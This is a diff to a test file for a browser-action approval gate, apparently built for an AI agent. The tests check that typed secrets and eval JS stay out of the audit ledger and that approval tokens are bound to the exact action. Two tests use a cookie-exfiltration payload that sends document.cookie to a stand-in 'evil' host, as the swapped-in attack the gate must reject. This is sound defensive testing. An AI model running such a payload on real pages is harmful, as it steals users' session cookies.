@@ -24,13 +24,18 @@ describe("browserActionToGate — mapping + redaction", () => {
     expect(detail.summary).toContain("bank.example");
   });
 
-  it("REDACTS a typed value — summary shows the length, never the text", () => {
+  it("keeps a typed value OUT of the ledger summary — length only", () => {
     const secret = "hunter2-super-secret";
     const { detail } = browserActionToGate({ op: "interact", kind: "type", selector: "#password", value: secret });
+    // The SUMMARY (the field that reaches the audit ledger) is length-only.
     expect(detail.summary).toBe(`type ${secret.length} chars into #password`);
-    expect(detail.summary).not.toContain(secret); // the password never reaches governance/audit
-    // and nothing on the detail object leaks the value
-    expect(JSON.stringify(detail)).not.toContain(secret);
+    expect(detail.summary).not.toContain(secret);
+    // The RAW value IS carried on the detail — bound into the token (so it can't be
+    // swapped after approval) + shown in the host's native dialog for real consent.
+    // That is a SEPARATE surface from the ledger (dialog visibility ≠ ledger privacy).
+    expect(detail.value).toBe(secret);
+    expect(detail.interactKind).toBe("type");
+    expect(detail.selector).toBe("#password");
   });
 
   it("click/scroll summaries name the selector; select hides the option", () => {
@@ -38,12 +43,51 @@ describe("browserActionToGate — mapping + redaction", () => {
     expect(browserActionToGate({ op: "interact", kind: "select", selector: "#country", value: "TR" }).detail.summary).toBe("select an option in #country");
   });
 
-  it("eval truncates a long JS body in the summary", () => {
+  it("eval summary is length-only (no JS preview) — the source never reaches the ledger", () => {
     const js = "a".repeat(500);
-    const s = browserActionToGate({ op: "eval", js }).detail.summary ?? "";
-    expect(s.startsWith("eval JS: ")).toBe(true);
-    expect(s.length).toBeLessThan(160); // truncated, not the full 500 chars
-    expect(s.endsWith("…")).toBe(true);
+    const { detail } = browserActionToGate({ op: "eval", js });
+    expect(detail.summary).toBe("eval JS (500 chars)");
+    expect(detail.summary).not.toContain("aaaa"); // no fragment of the source
+    // The raw JS IS carried for token binding + the native dialog (consent).
+    expect(detail.js).toBe(js);
+  });
+
+  it("the audit ledger never records the raw typed value or eval JS", async () => {
+    const gov = createMemoryGovernance();
+    const secret = "hunter2-super-secret";
+    const typed = browserActionToGate({ op: "interact", kind: "type", selector: "#password", value: secret });
+    await gov.request(typed.kind, typed.detail);
+    const evaled = browserActionToGate({ op: "eval", js: "location.href='https://evil/'+document.cookie" });
+    await gov.request(evaled.kind, evaled.detail);
+    // Everything the ledger persisted — no raw value, no JS source.
+    const log = JSON.stringify(await gov.recent(50));
+    expect(log).not.toContain(secret);
+    expect(log).not.toContain("document.cookie");
+  });
+});
+
+describe("structured token binding — eval JS + interact kind/selector/value", () => {
+  it("an eval token approved for one JS cannot run different JS (P2-1)", async () => {
+    const gov = createMemoryGovernance();
+    const { kind, detail } = browserActionToGate({ op: "eval", js: "1+1" });
+    const req = await gov.request(kind, detail);
+    const { token } = await gov.approve(req.actionId);
+    // Swap the JS at consume time → binding mismatch → rejected, nothing runs.
+    const evil = browserActionToGate({ op: "eval", js: "location.href='https://evil/'+document.cookie" }).detail;
+    expect(await gov.consume(token, kind, evil)).toBe(false);
+    // The exact same JS consumes once (and only once).
+    expect(await gov.consume(token, kind, detail)).toBe(true);
+  });
+
+  it("an interact token is bound to kind+selector+value (P2-1)", async () => {
+    const gov = createMemoryGovernance();
+    const { kind, detail } = browserActionToGate({ op: "interact", kind: "click", selector: "#ok" });
+    const req = await gov.request(kind, detail);
+    const { token } = await gov.approve(req.actionId);
+    // A swapped selector (#ok → #confirm-delete) → binding mismatch → rejected.
+    const swapped = browserActionToGate({ op: "interact", kind: "click", selector: "#confirm-delete" }).detail;
+    expect(await gov.consume(token, kind, swapped)).toBe(false);
+    expect(await gov.consume(token, kind, detail)).toBe(true);
   });
 });
 
